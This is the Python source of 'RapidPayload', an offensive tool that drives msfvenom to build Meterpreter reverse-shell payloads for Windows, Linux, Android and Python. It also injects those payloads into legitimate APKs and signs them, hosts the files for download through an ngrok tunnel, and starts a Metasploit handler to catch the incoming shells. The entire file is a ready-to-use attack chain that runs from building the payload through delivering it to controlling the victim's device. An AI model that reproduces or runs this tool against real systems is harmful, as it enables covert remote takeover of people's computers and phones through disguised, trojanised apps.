#!/usr/bin/python
#-*- coding: utf-8 -*-
#https://github.com/AngelSecurityTeam/RapidPayload
import os
import platform,subprocess,re
from time import sleep
cyan= '\033[36m'
bold= '\033[1m'
end= '\033[0m'

def banner():
    print(''' {1}{0}{1}
    ____              _     ______              __                __
   / __ \____ _____  (_)___/ / __ \____ ___  __/ /___  ____ _____/ /
  / /_/ / __ `/ __ \/ / __  / /_/ / __ `/ / / / / __ \/ __ `/ __  / 
 / _, _/ /_/ / /_/ / / /_/ / ____/ /_/ / /_/ / / /_/ / /_/ / /_/ /  
/_/ |_|\__,_/ .___/_/\__,_/_/    \__,_/\__, /_/\____/\__,_/\__,_/   
           /_/                        /____/  {2}AngelSecurityTeam{0}
'''.format(end,bold,cyan))


def main(platform, type):
    lhost = input("\n{0}{1}RapidPayload:~/LHOST# {2}".format(cyan, bold, end))
    lport = input("\n{0}{1}RapidPayload:~/LPORT# {2}".format(cyan, bold, end))
    nameFile = input("\n{0}{1}RapidPayload:~/FileName# {2}".format(cyan, bold, end))
    if platform == 'Windows' and type == '1':
        payload= 'windows/meterpreter/reverse_http'
        format= 'exe'
        ext= '.exe'
    if platform == 'Windows' and type == '2':
        payload= 'windows/meterpreter/reverse_https'
        format= 'exe'
        ext= '.exe'
    if platform == 'Windows' and type == '3':
        payload= 'windows/meterpreter/reverse_tcp'
        format= 'exe'
        ext= '.exe'
    if platform == 'Linux' and type == '1':
        payload= 'linux/x86/meterpreter_reverse_http'
        format= 'elf'
        ext= '.elf'
    if platform == 'Linux' and type == '2':
        payload= 'linux/x86/meterpreter_reverse_https'
        format= 'elf'
        ext= '.elf'
    if platform == 'Linux' and type == '3':
        payload= 'linux/x86/meterpreter/reverse_tcp'
        format= 'elf'
        ext= '.elf'
    if platform == 'Linux' and type == '4':
        payload= 'linux/x64/meterpreter_reverse_http'
        format= 'elf'
        ext= '.elf'
    if platform == 'Linux' and type == '5':
        payload= 'linux/x64/meterpreter_reverse_https'
        format= 'elf'
        ext= '.elf'
    if platform == 'Linux' and type == '6':
        payload= 'linux/x64/meterpreter/reverse_tcp'
        format= 'elf'
        ext= '.elf'                 
    if platform == 'Python' and type == '1':
        payload= 'python/meterpreter/reverse_http'
        format= 'raw'
        ext= '.py'
    if platform == 'Python' and type == '2':
        payload= 'python/meterpreter/reverse_https'
        format= 'raw'
        ext= '.py'
    if platform == 'Python' and type == '3':
        payload= 'python/meterpreter/reverse_tcp'
        format= 'raw'
        ext= '.py' 
    print("\033[1m\033[36m")
    os.system('sudo msfvenom -p '+payload+' LHOST='+lhost+' LPORT='+lport+' -f'+format+' -o '+nameFile+ext)
    os.system('sudo chmod +x '+nameFile+ext)
    sleep(3)


def legit(platform, type):
    lhost = input("\n{0}{1}RapidPayload:~/LHOST# {2}".format(cyan, bold, end))
    lport = input("\n{0}{1}RapidPayload:~/LPORT# {2}".format(cyan, bold, end))
    direct = input("\n{0}{1}RapidPayload:~/Path_of_your_APK# {2}".format(cyan, bold, end))
    newname = input("\n{0}{1}RapidPayload:~/NewFileName# {2}".format(cyan, bold, end))                    
    if platform == 'Android' and type == '1':
        payload= 'android/meterpreter/reverse_http'
        ext= '.apk'
    if platform == 'Android' and type == '2':
        payload= 'android/meterpreter/reverse_https'
        ext= '.apk'        
    if platform == 'Android' and type == '3':
        payload= 'android/meterpreter/reverse_tcp'
        ext= '.apk'         
    print("\033[1m\033[36m")
    os.system('sudo msfvenom -p '+payload+' -x '+direct+' LHOST='+lhost+' LPORT='+lport+' -o '+newname+ext)      
    sleep(3)

def Normal(platform, type):
    lhost = input("\n{0}{1}RapidPayload:~/LHOST# {2}".format(cyan, bold, end))
    lport = input("\n{0}{1}RapidPayload:~/LPORT# {2}".format(cyan, bold, end))
    newname = input("\n{0}{1}RapidPayload:~/NewFileName# {2}".format(cyan, bold, end))                    
    if platform == 'Android' and type == '1':
        payload= 'android/meterpreter/reverse_http'
        ext= '.apk'
    if platform == 'Android' and type == '2':
        payload= 'android/meterpreter/reverse_https'
        ext= '.apk'        
    if platform == 'Android' and type == '3':
        payload= 'android/meterpreter/reverse_tcp'
        ext= '.apk'         
    print("\033[1m\033[36m")
    os.system('sudo msfvenom -p '+payload+' LHOST='+lhost+' LPORT='+lport+' -o '+newname+ext)
    print("\n\033[1m\033[36m#|signing APK|#\n\033[1m\033[36m")
    os.system("keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000")
    os.system('jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore '+newname+ext+' alias_name')
    os.system("rm -rf my-release-key.keystore")
    sleep(3)

def Ngrok():
    print("\033[1m\033[36m")
    os.system("ls")	
    print("")
    name1=input("\n{0}{1}RapidPayload:~/FileName# {2}".format(cyan, bold, end))
    #http.server 80
    os.system("python3 -m http.server 80 > .server 2> /dev/null &")          
    os.system("chmod +x ngrok")
    #http.server 80 NGROK
    portN=80
    os.system("./ngrok http {} > /dev/null &".format(portN))
    sleep(8)
    os.system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z]*\.ngrok.io" -oh > link2.url')
    urlFile = open('link2.url', 'r')
    url = urlFile.read()
    urlFile.close()
    if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
      linkngrok=url+'/'+name1		
      print("\n\033[1m\033[36mRapidPayload:~/LinkNgrok# \033[1m\033[0m"+linkngrok)
   
    print(" ")	

def MSF():
    host1=input("\n{0}{1}RapidPayload:~/LHOST# {2}".format(cyan, bold, end))
    port1=input("\n{0}{1}RapidPayload:~/LPORT# {2}".format(cyan, bold, end))
    payload1=input("\n{0}{1}RapidPayload:~/PAYLOAD# {2}".format(cyan, bold, end))   
    datamsf = "use exploit/multi/handler;set PAYLOAD "+payload1+";set LHOST "+host1+";set LPORT "+port1+";run"
    subprocess.call(["msfconsole", "-q" ,"-x", datamsf])    
         
     
def RapidP():
    
    select = input('\n{2}{0}{2}[{1}{2}1{0}]{2}{1} {2}Windows\n{0}{2}[{1}{2}2{2}{0}]{1} {2}Linux\n{0}{2}[{1}{2}3{2}{0}]{1} {2}Android\n{0}{2}[{1}{2}{2}4{0}]{1} {2}Python\n{0}{2}[{1}{2}{2}5{0}]{1} {2}Connect_Ngrok\n{0}{2}[{1}{2}{2}6{0}]{1} {2}Connect_MSF\n{0}{0}[{1}{2}0{0}]{1} {2}Exit\n\n{0}{2}RapidPayload:~#{1} '.format(cyan, end, bold))
    if select == '1':        
        type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}windows/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}windows/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}windows/meterpreter/reverse_tcp\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/Windows#{1} '.format(cyan, end, bold))
        if type == '0':
            RapidP()
        main('Windows', type)
    if select == '2':       
        type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}linux/x86/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}linux/x86/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}linux/x86/meterpreter/reverse_tcp{0}{1}\n{0}[{1}{2}4{0}]{1} {2}linux/x64/meterpreter/reverse_http{0}{1}\n{0}[{1}{2}5{0}]{1} {2}linux/x64/meterpreter/reverse_https{0}{1}\n{0}[{1}{2}6{0}]{1} {2}linux/x64/meterpreter/reverse_tcp\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/Linux#{1} '.format(cyan, end, bold))
        if type == '0':
            RapidP()
        main('Linux', type)
    if select == '3':
        droi = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}Normal\n{0}[{1}{2}2{0}]{1} {2}Infect Legitimate APK\n{0}{0}[{1}{2}0{0}]{1} {2}{2}Menu\n\n{0}{2}RapidPayload:~/Android#{1} '.format(cyan, end, bold))
        if droi == '1':				
            type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}android/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}android/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}android/meterpreter/reverse_tcp\n{0}[{1}{2}0{0}]{1} {2}{2}Menu\n\n{0}{2}RapidPayload:~/Android#{1} '.format(cyan, end, bold))
            if type == '0':
                RapidP()            
            Normal('Android', type)
        if droi == '2':				
            type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}android/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}android/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}android/meterpreter/reverse_tcp\n{0}[{1}{2}0{0}]{1} {2}{2}Menu\n\n{0}{2}RapidPayload:~/Android#{1} '.format(cyan, end, bold))
            if type == '0':
                RapidP()            
            legit('Android', type)            
    if select == '4':
        type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}python/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}python/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}python/meterpreter/reverse_tcp\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/Python#{1} '.format(cyan, end, bold))

        if type == '0':
            RapidP()
        main('Python', type)
    if select == '5':
        Ngrok()
    if select == '6':
        MSF()                
    elif select == '0':
        print("\n")
        exit(0)
    else:
        sleep(2)
        RapidP()

if __name__ == "__main__":
    try:
        banner()     
        RapidP()
    except KeyboardInterrupt:
        print("\n")
        exit(0)
